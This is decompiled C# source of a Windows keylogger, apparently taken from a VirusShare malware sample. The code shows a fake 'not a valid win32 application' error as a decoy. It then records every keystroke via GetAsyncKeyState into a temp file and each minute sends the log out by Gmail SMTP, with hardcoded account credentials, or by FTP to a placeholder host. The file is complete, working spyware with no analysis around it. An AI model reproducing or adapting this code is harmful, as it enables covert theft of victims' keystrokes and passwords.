// Decompiled with JetBrains decompiler
// Type: Shock_Labs_Keylogger_v1._0.Program
// Assembly: FishBot 3.9, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4EC5FCC8-60C9-4310-A063-362C7873ED20
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5f0b779b75df09f8299783aaf39ce7ec69d5a1c928c55ee627351518cb04b2f2.exe

using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Shock_Labs_Keylogger_v1._0
{
  internal class Program
  {
    public static int temp;
    public static int tMinute;
    public static bool UseFTP;
    public static StreamWriter Logger;
    public static int tHour;

    [DllImport("user32.dll")]
    public static extern bool GetAsyncKeyState(int vKeyCode);

    [DllImport("kernel32.dll")]
    public static extern bool FreeConsole();

    public static void Log()
    {
      Program.FreeConsole();
      int num = (int) MessageBox.Show("This program is not a valid win32 application!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Program.UseFTP = false;
      Program.tHour = DateTime.Now.Hour;
      Program.tMinute = DateTime.Now.Minute;
      if (!System.IO.File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt"))
        new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt", FileMode.Create).Close();
      Program.Logger = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt");
      while (true)
      {
        while (DateTime.Now.Minute != Program.tMinute + 1 || DateTime.Now.Minute < Program.tMinute && DateTime.Now.Hour > Program.tHour)
        {
          for (int vKeyCode = 0; vKeyCode <= (int) byte.MaxValue; ++vKeyCode)
          {
            if (Program.GetAsyncKeyState(vKeyCode))
            {
              if (Program.temp != vKeyCode && vKeyCode != 1 && vKeyCode != 2)
              {
                Program.Logger.Write(Convert.ToString((object) (Keys) vKeyCode) + " ");
                Program.temp = vKeyCode;
                Thread.Sleep(55);
              }
              else
                Program.temp = -1203;
              Thread.Sleep(55);
            }
          }
        }
        Program.tMinute = DateTime.Now.Minute;
        Program.tHour = DateTime.Now.Hour;
        Program.Logger.Close();
        if (Program.UseFTP)
          Program.Upload();
        else
          Program.Email();
      }
    }

    public static void Email()
    {
      try
      {
        string str = "teambana1";
        string password = "qbulina1";
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587);
        smtpClient.EnableSsl = true;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(str, password);
        MailMessage message = new MailMessage();
        message.To.Add(new MailAddress(str));
        message.From = new MailAddress(str);
        message.Attachments.Add(new Attachment(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt"));
        message.Subject = "Keylogger Log for " + Convert.ToString(DateTime.Now);
        smtpClient.Send(message);
        message.Dispose();
        Thread.Sleep(5000);
        Program.Logger = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt");
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }

    public static void Upload()
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(new Uri("ftp://example.com/log.txt"));
        ftpWebRequest.UseBinary = true;
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("example", "examplepw");
        ftpWebRequest.Method = "STOR";
        Stream requestStream = ftpWebRequest.GetRequestStream();
        FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt", FileMode.Open);
        byte[] buffer = new byte[fileStream.Length];
        Console.WriteLine(buffer.Length);
        fileStream.Read(buffer, 0, buffer.Length);
        requestStream.Write(buffer, 0, buffer.Length);
        fileStream.Close();
        requestStream.Close();
        Program.Logger = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\log.txt", true);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }

    private static void Main(string[] args) => new Thread(new ThreadStart(Program.Log)).Start();
  }
}
